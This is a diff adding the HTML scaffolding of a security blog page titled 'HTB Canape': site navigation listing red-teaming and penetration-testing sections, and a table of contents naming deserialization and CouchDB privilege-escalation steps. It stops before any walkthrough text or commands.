@@ -1,0 +1,2450 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.1, mkdocs-material-7.1.9">
+    
+    
+      
+        <title>HTB Canape - LeeCyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ca7ac06f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.f1a3b89f.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
+  
+    
+    <script>function __prefix(e){return new URL("../../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hackthebox-canape" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../index.html" title="LeeCyberSec" class="md-header__button md-logo" aria-label="LeeCyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            LeeCyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              HTB Canape
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../../index.html" class="md-tabs__link">
+      Home
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../red-teaming/index.html" class="md-tabs__link">
+        Red Teaming
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../penetration-testing/index.html" class="md-tabs__link">
+        Penetration Testing
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../index.html" class="md-tabs__link md-tabs__link--active">
+        Walkthrough
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../blue-teaming/index.html" class="md-tabs__link">
+        Blue Teaming
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../../../about/index.html" class="md-tabs__link">
+      About Me
+    </a>
+  </li>
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="LeeCyberSec" class="md-nav__button md-logo" aria-label="LeeCyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    LeeCyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        Home
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      <label class="md-nav__link" for="__nav_2">
+        Red Teaming
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Red Teaming" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Red Teaming
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_2" type="checkbox" id="__nav_2_2" >
+      
+      <label class="md-nav__link" for="__nav_2_2">
+        Unix System
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Unix System" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Unix System
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/filesystem.html" class="md-nav__link">
+        Filesystem
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/commands.html" class="md-nav__link">
+        Commands
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/services.html" class="md-nav__link">
+        Services
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/scripting.html" class="md-nav__link">
+        Scripting
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/unix-system/terminal.html" class="md-nav__link">
+        Terminal
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/antivirus-evasion/index.html" class="md-nav__link">
+        Antivirus Evasion
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2_4" type="checkbox" id="__nav_2_4" >
+      
+      <label class="md-nav__link" for="__nav_2_4">
+        Exploit Development
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Exploit Development" data-md-level="2">
+        <label class="md-nav__title" for="__nav_2_4">
+          <span class="md-nav__icon md-icon"></span>
+          Exploit Development
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/exploit-dev/buffer-overflow/index.html" class="md-nav__link">
+        Buffer Overflow
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/exploit-dev/metasploit-framework/index.html" class="md-nav__link">
+        Metasploit Framework
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/exploit-dev/nse-script/index.html" class="md-nav__link">
+        Nmap Scripting Engine
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/malware-development/index.html" class="md-nav__link">
+        Malware development
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../red-teaming/powershell-empire/index.html" class="md-nav__link">
+        Powershell Empire
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" >
+      
+      <label class="md-nav__link" for="__nav_3">
+        Penetration Testing
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Penetration Testing" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Penetration Testing
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" type="checkbox" id="__nav_3_2" >
+      
+      <label class="md-nav__link" for="__nav_3_2">
+        External & Internal
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="External & Internal" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_2">
+          <span class="md-nav__icon md-icon"></span>
+          External & Internal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_1" type="checkbox" id="__nav_3_2_1" >
+      
+      <label class="md-nav__link" for="__nav_3_2_1">
+        Reconnaissance
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Reconnaissance" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_1">
+          <span class="md-nav__icon md-icon"></span>
+          Reconnaissance
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/reconnaissance/infor-gathering.html" class="md-nav__link">
+        Info Gathering
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/reconnaissance/active-scanning.html" class="md-nav__link">
+        Active Scanning
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_2" type="checkbox" id="__nav_3_2_2" >
+      
+      <label class="md-nav__link" for="__nav_3_2_2">
+        Common Services
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Common Services" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_2">
+          <span class="md-nav__icon md-icon"></span>
+          Common Services
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/general.html" class="md-nav__link">
+        general
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/ftp-21.html" class="md-nav__link">
+        ftp 21
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/smtp-25.html" class="md-nav__link">
+        smtp 25
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/dns-53.html" class="md-nav__link">
+        dns 53
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/pop3-110.html" class="md-nav__link">
+        pop3 110
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/nfs-111.html" class="md-nav__link">
+        nfs 111
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/smb-139-445.html" class="md-nav__link">
+        smb 139,445
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/snmp-161.html" class="md-nav__link">
+        snmp 161
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/mssql-1443.html" class="md-nav__link">
+        mssql 1443
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/mysql-3306.html" class="md-nav__link">
+        mysql 3306
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/postgresql-5432.html" class="md-nav__link">
+        postgresql 5432
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/common-services/mongodb-27017.html" class="md-nav__link">
+        mongodb 27017
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_3" type="checkbox" id="__nav_3_2_3" >
+      
+      <label class="md-nav__link" for="__nav_3_2_3">
+        Remote Exploitation
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Remote Exploitation" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_3">
+          <span class="md-nav__icon md-icon"></span>
+          Remote Exploitation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/remote-exploitation/Unix%26Linux.html" class="md-nav__link">
+        Unix&Linux
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/remote-exploitation/windows.html" class="md-nav__link">
+        Windows
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/file-transfer/index.html" class="md-nav__link">
+        File Transfer
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/password-attack/index.html" class="md-nav__link">
+        Password Attack
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/port-redirection-tunneling/index.html" class="md-nav__link">
+        Redirec & Tunnel
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2_7" type="checkbox" id="__nav_3_2_7" >
+      
+      <label class="md-nav__link" for="__nav_3_2_7">
+        Privilege Escalation
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Privilege Escalation" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_2_7">
+          <span class="md-nav__icon md-icon"></span>
+          Privilege Escalation
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/local-enum/Unix%26Linux.html" class="md-nav__link">
+        Unix Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/common-escal/Unix%26Linux.html" class="md-nav__link">
+        Unix Escalation
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/local-enum/Windows.html" class="md-nav__link">
+        Windows Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/external-internal/privilege-escalation/common-escal/Windows.html" class="md-nav__link">
+        Windows Escalation
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" type="checkbox" id="__nav_3_3" >
+      
+      <label class="md-nav__link" for="__nav_3_3">
+        Active Directory
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Active Directory" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          Active Directory
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/enumeration.html" class="md-nav__link">
+        Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/authentication.html" class="md-nav__link">
+        Authentication
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/lateral-movement.html" class="md-nav__link">
+        Lateral Movement
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/active-directory/persistent.html" class="md-nav__link">
+        Persistent
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4" type="checkbox" id="__nav_3_4" >
+      
+      <label class="md-nav__link" for="__nav_3_4">
+        Web Application
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Web Application" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_4">
+          <span class="md-nav__icon md-icon"></span>
+          Web Application
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/web-application/enumeration.html" class="md-nav__link">
+        Enumeration
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/web-application/exploitation.html" class="md-nav__link">
+        Exploitation
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/mobile-application/index.html" class="md-nav__link">
+        Moble Application
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/wireless-rfid/index.html" class="md-nav__link">
+        Wireless & RFID
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../penetration-testing/social-engineering/index.html" class="md-nav__link">
+        Social Engineering
+      </a>
+    </li>
+  
+
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" checked>
+      
+      <label class="md-nav__link" for="__nav_4">
+        Walkthrough
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Walkthrough" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          Walkthrough
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../index.html" class="md-nav__link">
+        __index__
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" checked>
+      
+      <label class="md-nav__link" for="__nav_4_2">
+        Hack The Box
+        <span class="md-nav__icon md-icon"></span>
+      </label>
+      <nav class="md-nav" aria-label="Hack The Box" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_2">
+          <span class="md-nav__icon md-icon"></span>
+          Hack The Box
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lame/index.html" class="md-nav__link">
+        HTB Lame
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Legacy/index.html" class="md-nav__link">
+        HTB Legacy
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Devel/index.html" class="md-nav__link">
+        HTB Devel
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Popcorn/index.html" class="md-nav__link">
+        HTB Popcorn
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Beep/index.html" class="md-nav__link">
+        HTB Beep
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Optimum/index.html" class="md-nav__link">
+        HTB Optimum
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bastard/index.html" class="md-nav__link">
+        HTB Bastard
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cronos/index.html" class="md-nav__link">
+        HTB Cronos
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Blue/index.html" class="md-nav__link">
+        HTB Blue
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Nineveh/index.html" class="md-nav__link">
+        HTB Nineveh
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Shocker/index.html" class="md-nav__link">
+        HTB Shocker
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bashed/index.html" class="md-nav__link">
+        HTB Bashed
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Nibbles/index.html" class="md-nav__link">
+        HTB Nibbles
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Jerry/index.html" class="md-nav__link">
+        HTB Jerry
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Bastion/index.html" class="md-nav__link">
+        HTB Bastion
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tabby/index.html" class="md-nav__link">
+        HTB Tabby
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ServMon/index.html" class="md-nav__link">
+        HTB ServMon
+      </a>
+    </li>
+  
+
+          
+            
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          HTB Canape
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="index.html" class="md-nav__link md-nav__link--active">
+        HTB Canape
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#information-gathering" class="md-nav__link">
+    Information Gathering
+  </a>
+  
+    <nav class="md-nav" aria-label="Information Gathering">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#openning-services" class="md-nav__link">
+    Openning Services
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apache-httpd-2418" class="md-nav__link">
+    Apache httpd 2.4.18
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    Foothold
+  </a>
+  
+    <nav class="md-nav" aria-label="Foothold">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#insecure-deserialization" class="md-nav__link">
+    Insecure Deserialization
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    Privilege Escalation
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#local-enumeration" class="md-nav__link">
+    Local enumeration
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#apache-couchdb-pe" class="md-nav__link">
+    Apache CouchDB PE
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#erlang-couchdb-local-privescal" class="md-nav__link">
+    Erlang CouchDB Local PrivEscal
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sudo-pip-command" class="md-nav__link">
+    Sudo Pip Command
+  </a>
+  
+</li>
+        
